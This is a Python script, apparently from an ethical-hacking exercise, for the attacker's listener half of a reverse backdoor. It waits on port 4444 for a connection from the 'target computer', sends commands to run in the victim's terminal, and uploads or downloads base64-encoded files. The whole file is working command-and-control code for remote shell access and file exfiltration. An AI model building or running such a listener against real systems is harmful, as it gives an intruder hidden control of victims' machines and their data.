
import socket
import json
import base64


class Listener:
    """
    This Listener class provides a mechanism to listen for incoming connections from the reverse backdoor that is used by the target computer
    """

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        """
        This function executes a command remotely on the targets computer
        allowing us to interact with the terminal

        Args:
            command (String): The command to execute in the targets terminal

        Returns:
            Bytes: The result of the command executed
        """
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, file_name, data):
        with open(file_name, 'wb') as f:
            # Fix the bug that prevents from downloading images and other non-text files
            decoded_data = base64.b64decode(data)
            f.write(decoded_data)
            return '[+] Download successful.'

    def read_file(self, path):
        with open(path, 'rb') as f:
            return base64.b64encode(f.read())

    def start(self):
        """ 
        This function start the listening process and keep listening for incoming connections
        """
        while True:
            command = input("\n>> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1]).decode()
                    command.append(file_content)
                result = self.execute_remotely(command)
                # result = self.write_file(command[1], result)
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)


my_listener = Listener('192.168.1.12', 4444)
my_listener.start()
